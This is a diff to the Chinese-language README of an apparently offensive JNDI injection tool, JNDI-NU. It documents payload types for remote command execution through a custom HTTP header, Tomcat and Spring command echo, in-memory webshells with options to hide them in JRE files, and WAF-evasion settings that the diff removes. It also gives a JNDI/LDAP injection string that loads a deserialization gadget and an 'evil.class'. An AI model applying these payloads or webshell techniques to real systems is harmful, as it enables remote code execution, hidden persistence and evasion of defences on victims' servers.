@@ -17,7 +17,7 @@ Usage: java -jar JNDI-NU.jar [options]
 ```
 
 * 目前支持的所有 ```PayloadType``` 为
-    * ```Bypass```: 用于rmi本地工程类加载，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
+    * ```Bypass```: 用于rmi本地工厂类加载，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
     * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami```的方式传递想要执行的命令
     * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot``` 时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
     * ```nu1r```：用于执行命令，如果命令有特殊字符，支持对命令进行 Base64编码后传输
@@ -61,7 +61,7 @@ Usage: java -jar JNDI-NU.jar [options]
 - u：内存马绑定的路径,default [/version.txt]
 - pw：内存马的密码,default [p@ssw0rd]
 - r：内存马 Referer check,default [https://nu1r.cn/]
-- h：通过将文件写入$JAVA_HOME来隐藏内存shell，目前只支持SpringControllerMS
+- h：通过将文件写入$JAVA_HOME来隐藏内存shell，目前只支持 SpringControllerMS
 - ht：隐藏内存外壳，输入1:write /jre/lib/charsets.jar 2:write /jre/classes/
 
 示例
@@ -91,6 +91,7 @@ Usage: java -jar JNDI-NU.jar [options]
 * ```WSFilter```: `CMD` 命令回显 WebSocket 内存马，`cmd命令回显`
 * ```TomcatExecutor``` : Executor 内存马，`cmd命令回显`
 * ```TomcatUpgrade```: TomcatUpgrade 内存马，`cmd命令回显`
+* ```Struts2ActionMS```: Action 类型内存马
 
 ---
 
@@ -269,12 +270,6 @@ WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命�
 
 - a：恶意类是否继承 AbstractTranslet
 - o：使用反射绕过
-- dt：使用脏数据绕过WAF，类型:1:Random Hashable Collections/2:LinkedList nested /3:TC_RESET in Serialized data
-- dl：使用类型1或3时脏数据的长度/使用类型2时嵌套循环的计数
-  - 使用dt与dl指定混淆的方式： `dt` 指定混淆类型，默认为1， `dl` 指定脏数据大小，默认为5000
-  - 当dt值为1时，随机使用 ArrayList/LinkedList/HashMap/LinkedHashMap/TreeMap 等集合类型来封装 object
-  - 当dt值为2时，使用循环嵌套 LinkedList 来封装 object
-  - 当dt值为3时，在 TC_RESET 中加入脏数据
 ~~- j：使用 ObjectInputStream/ObjectOutputStream 来构造序列化流~~（这个构造的流有BUG，还在思考修复）
 
 * 使用示例：
@@ -419,7 +414,7 @@ BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() �
 ```
 {{url
   (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections3/nu1r/Base64/{{base64
-      (LF#/tmp/evil.class-org.su18.Evil)
+      (LF#/tmp/evil.class-org)
   }}})
 }}
 ```
